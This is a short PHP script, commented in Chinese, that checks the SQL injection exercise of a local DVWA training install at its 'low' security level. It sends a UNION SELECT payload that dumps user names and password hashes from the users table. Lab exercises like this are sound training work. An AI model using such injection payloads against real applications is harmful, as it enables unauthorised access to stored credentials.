<?php
// DVWA SQLi low 等级验证脚本
// 前提：已登录 DVWA 且 security cookie 为 low
// 目标入口：vulnerabilities/sqli/index.php

$BASE = 'http://localhost/dvwa/vulnerabilities/sqli/index.php';

function probe($url, $id) {
    $ch = curl_init($url . '?Submit=Submit&id=' . urlencode($id));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // 携带登录会话 cookie
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    $html = curl_exec($ch);
    curl_close($ch);
    // 抽取 ID 结果区块
    if (preg_match('#<pre>.*?</pre>#s', $html, $m)) {
        return trim($m[0]);
    }
    return 'NO_RESULT_BLOCK (auth failed or not low level?)';
}

$normal = "1";
$attack = "1' UNION SELECT user, password FROM users WHERE '1'='1";

echo "=== NORMAL INPUT id=$normal ===\n";
echo probe($BASE, $normal) . "\n\n";

echo "=== ATTACK INPUT ===\n";
echo probe($BASE, $attack) . "\n";
?>